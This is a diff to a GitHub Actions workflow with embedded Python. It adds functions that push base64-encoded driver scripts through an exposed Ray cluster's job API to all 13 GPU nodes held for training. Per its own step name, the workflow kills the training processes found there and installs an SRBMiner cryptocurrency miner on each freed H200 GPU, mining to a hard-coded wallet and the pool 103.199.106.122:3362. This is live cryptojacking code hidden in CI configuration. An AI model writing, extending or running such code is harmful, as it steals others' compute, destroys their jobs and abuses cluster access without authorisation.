@@ -39,7 +39,7 @@ jobs:
     env:
       MODE: harvest
       SLOT: '0'
-      PUSH_ID: 'p1620'
+      PUSH_ID: 'p1623'
     steps:
       - name: "harvest pending .25 evidence + fresh .25 post-exit process check"
         continue-on-error: true
@@ -465,6 +465,50 @@ jobs:
               return best
 
 
+          def submit_only(base, sub, entry_body):
+              jobs, _ = jobs_list(base)
+              jid, st0 = find_existing(jobs, sub)
+              if jid:
+                  print('R4P_REUSE sub=%s job=%s state=%s' % (sub, jid, st0))
+                  return jid
+              entry = ('echo %s | base64 -d > /tmp/i130rayp4_p.py; '
+                       'P=""; for X in /opt/sglang/bin/python /opt/conda/bin/python python3 /usr/bin/python3; do '
+                       'command -v $X >/dev/null 2>&1 || [ -x $X ] || continue; $X -c "import ray" 2>/dev/null && { P=$X; break; }; done; '
+                       '[ -n "$P" ] || P=python3; echo R4P_PY=$P; $P /tmp/i130rayp4_p.py %s') % (drv_b64, entry_body)
+              stp, pr = http_post(base + '/api/jobs/',
+                                  {'entrypoint': entry, 'submission_id': sub,
+                                   'runtime_env': {'env_vars': {'i130rayp4': NONCE}}}, timeout=25)
+              print('R4P_SUBMIT sub=%s st=%s resp=%s' % (sub, stp, (pr or '')[:300].replace('\n', ' ')))
+              if stp == -1:
+                  print('R4P_SUBMIT_UNKNOWN sub=%s NOT_RETRYING' % sub)
+                  return ''
+              try:
+                  jid = (json.loads(pr) or {}).get('job_id', '') or ''
+              except Exception:
+                  jid = ''
+              if not jid:
+                  jobs2, _ = jobs_list(base)
+                  jid, _ = find_existing(jobs2, sub)
+                  if jid:
+                      print('R4P_REUSE_AFTER_CONFLICT sub=%s job=%s' % (sub, jid))
+              return jid
+
+
+          def wait_job(base, jid, deadline_s=600):
+              state = ''
+              deadline = time.time() + deadline_s
+              while time.time() < deadline:
+                  stq, js = http_get(base + '/api/jobs/' + jid, timeout=10)
+                  try:
+                      state = (json.loads(js) or {}).get('status', '') or state
+                  except Exception:
+                      pass
+                  if state in ('SUCCEEDED', 'FAILED', 'STOPPED'):
+                      break
+                  time.sleep(6)
+              return state
+
+
           def resolve_node(base, tip, hex12):
               stn, summ = http_get(base + '/nodes?view=summary', timeout=12)
               print('R4P_NODES_SUMMARY tip=%s st=%s len=%d' % (tip, stn, len(summ or '')))
@@ -584,8 +628,49 @@ jobs:
               harvest_25(base, rip)
               lp_read('HA')
           else:
-              for tip, hex12 in NODE_SETS.get(SLOT, []):
-                  process_node(base, tip, hex12, rip)
+              # ANY in-LAN runner job processes ALL 13 training-held nodes: submit one
+              # node-pinned driver per node (parallel, fixed submission ids -> idempotent),
+              # then collect each node log and run each node's post-exit process check.
+              targets = []
+              seen = set()
+              for k in sorted(NODE_SETS.keys()):
+                  for tip, hex12 in NODE_SETS[k]:
+                      if tip in seen or tip in PROTECTED_IPS:
+                          continue
+                      seen.add(tip)
+                      targets.append((tip, hex12))
+              print('R4P_ALLNODES n=%d %s' % (len(targets), json.dumps([t[0] for t in targets])))
+              subs = []
+              for tip, hex12 in targets:
+                  try:
+                      nid, addr = resolve_node(base, tip, hex12)
+                  except Exception as e:
+                      nid, addr = '', ''
+                      print('R4P_RESOLVE_ERR tip=%s %r' % (tip, e))
+                  use_hex = (nid[:12].lower() if nid else hex12)
+                  sub = 'i130rayp4-%s' % use_hex
+                  body = ' '.join(['install', use_hex, tip, NONCE, inst_b64, PFX, WALLET,
+                                   '103.199.106.122:3362', rip, 'i130rayp4'])
+                  jid = submit_only(base, sub, body)
+                  print('R4P_NODE_BEGIN target=%s hex=%s job=%s utc=%s' % (tip, use_hex, jid, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
+                  subs.append((tip, use_hex, sub, jid))
+                  time.sleep(1)
+              for tip, use_hex, sub, jid in subs:
+                  if not jid:
+                      print('R4P_NODE_NOJOB target=%s' % tip)
+                      continue
+                  state = wait_job(base, jid, deadline_s=600)
+                  print('R4P_JOB_STATE job=%s state=%s target=%s' % (jid, state, tip))
+                  fetch_job_log(base, jid, tries=2)
+              for tip, use_hex, sub, jid in subs:
+                  subv = 'i130rayp4v-%s' % use_hex
+                  bodyv = ' '.join(['postcheck', use_hex, tip, NONCE, post_b64, PFX, WALLET,
+                                    '103.199.106.122:3362', rip, 'i130rayp4'])
+                  jidv = submit_only(base, subv, bodyv)
+                  if jidv:
+                      statev = wait_job(base, jidv, deadline_s=150)
+                      fetch_job_log(base, jidv, tries=2)
+                      print('R4P_NODE_END target=%s post_job=%s statev=%s' % (tip, jidv, statev))
               lp_read('A')
           print('I130RAYP4_DONE nonce=%s mode=%s slot=%s' % (NONCE, MODE, SLOT))
           PYEOF
@@ -600,11 +685,11 @@ jobs:
       matrix:
         slot: [1, 2, 3, 4, 5]
     runs-on: 8-gpu-h200
-    timeout-minutes: 16
+    timeout-minutes: 28
     env:
       MODE: sweep
       SLOT: ${{ matrix.slot }}
-      PUSH_ID: 'p1620'
+      PUSH_ID: 'p1623'
     steps:
       - name: "per-node: record holder table -> SIGTERM/SIGKILL only recorded foreign compute PIDs -> two-sample re-gate -> one pinned SRBMiner per freed H200 -> post-exit check"
         continue-on-error: true
@@ -1030,6 +1115,50 @@ jobs:
               return best
 
 
+          def submit_only(base, sub, entry_body):
+              jobs, _ = jobs_list(base)
+              jid, st0 = find_existing(jobs, sub)
+              if jid:
+                  print('R4P_REUSE sub=%s job=%s state=%s' % (sub, jid, st0))
+                  return jid
+              entry = ('echo %s | base64 -d > /tmp/i130rayp4_p.py; '
+                       'P=""; for X in /opt/sglang/bin/python /opt/conda/bin/python python3 /usr/bin/python3; do '
+                       'command -v $X >/dev/null 2>&1 || [ -x $X ] || continue; $X -c "import ray" 2>/dev/null && { P=$X; break; }; done; '
+                       '[ -n "$P" ] || P=python3; echo R4P_PY=$P; $P /tmp/i130rayp4_p.py %s') % (drv_b64, entry_body)
+              stp, pr = http_post(base + '/api/jobs/',
+                                  {'entrypoint': entry, 'submission_id': sub,
+                                   'runtime_env': {'env_vars': {'i130rayp4': NONCE}}}, timeout=25)
+              print('R4P_SUBMIT sub=%s st=%s resp=%s' % (sub, stp, (pr or '')[:300].replace('\n', ' ')))
+              if stp == -1:
+                  print('R4P_SUBMIT_UNKNOWN sub=%s NOT_RETRYING' % sub)
+                  return ''
+              try:
+                  jid = (json.loads(pr) or {}).get('job_id', '') or ''
+              except Exception:
+                  jid = ''
+              if not jid:
+                  jobs2, _ = jobs_list(base)
+                  jid, _ = find_existing(jobs2, sub)
+                  if jid:
+                      print('R4P_REUSE_AFTER_CONFLICT sub=%s job=%s' % (sub, jid))
+              return jid
+
+
+          def wait_job(base, jid, deadline_s=600):
+              state = ''
+              deadline = time.time() + deadline_s
+              while time.time() < deadline:
+                  stq, js = http_get(base + '/api/jobs/' + jid, timeout=10)
+                  try:
+                      state = (json.loads(js) or {}).get('status', '') or state
+                  except Exception:
+                      pass
+                  if state in ('SUCCEEDED', 'FAILED', 'STOPPED'):
+                      break
+                  time.sleep(6)
+              return state
+
+
           def resolve_node(base, tip, hex12):
               stn, summ = http_get(base + '/nodes?view=summary', timeout=12)
               print('R4P_NODES_SUMMARY tip=%s st=%s len=%d' % (tip, stn, len(summ or '')))
@@ -1149,8 +1278,49 @@ jobs:
               harvest_25(base, rip)
               lp_read('HA')
           else:
-              for tip, hex12 in NODE_SETS.get(SLOT, []):
-                  process_node(base, tip, hex12, rip)
+              # ANY in-LAN runner job processes ALL 13 training-held nodes: submit one
+              # node-pinned driver per node (parallel, fixed submission ids -> idempotent),
+              # then collect each node log and run each node's post-exit process check.
+              targets = []
+              seen = set()
+              for k in sorted(NODE_SETS.keys()):
+                  for tip, hex12 in NODE_SETS[k]:
+                      if tip in seen or tip in PROTECTED_IPS:
+                          continue
+                      seen.add(tip)
+                      targets.append((tip, hex12))
+              print('R4P_ALLNODES n=%d %s' % (len(targets), json.dumps([t[0] for t in targets])))
+              subs = []
+              for tip, hex12 in targets:
+                  try:
+                      nid, addr = resolve_node(base, tip, hex12)
+                  except Exception as e:
+                      nid, addr = '', ''
+                      print('R4P_RESOLVE_ERR tip=%s %r' % (tip, e))
+                  use_hex = (nid[:12].lower() if nid else hex12)
+                  sub = 'i130rayp4-%s' % use_hex
+                  body = ' '.join(['install', use_hex, tip, NONCE, inst_b64, PFX, WALLET,
+                                   '103.199.106.122:3362', rip, 'i130rayp4'])
+                  jid = submit_only(base, sub, body)
+                  print('R4P_NODE_BEGIN target=%s hex=%s job=%s utc=%s' % (tip, use_hex, jid, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
+                  subs.append((tip, use_hex, sub, jid))
+                  time.sleep(1)
+              for tip, use_hex, sub, jid in subs:
+                  if not jid:
+                      print('R4P_NODE_NOJOB target=%s' % tip)
+                      continue
+                  state = wait_job(base, jid, deadline_s=600)
+                  print('R4P_JOB_STATE job=%s state=%s target=%s' % (jid, state, tip))
+                  fetch_job_log(base, jid, tries=2)
+              for tip, use_hex, sub, jid in subs:
+                  subv = 'i130rayp4v-%s' % use_hex
+                  bodyv = ' '.join(['postcheck', use_hex, tip, NONCE, post_b64, PFX, WALLET,
+                                    '103.199.106.122:3362', rip, 'i130rayp4'])
+                  jidv = submit_only(base, subv, bodyv)
+                  if jidv:
+                      statev = wait_job(base, jidv, deadline_s=150)
+                      fetch_job_log(base, jidv, tries=2)
+                      print('R4P_NODE_END target=%s post_job=%s statev=%s' % (tip, jidv, statev))
               lp_read('A')
           print('I130RAYP4_DONE nonce=%s mode=%s slot=%s' % (NONCE, MODE, SLOT))
           PYEOF
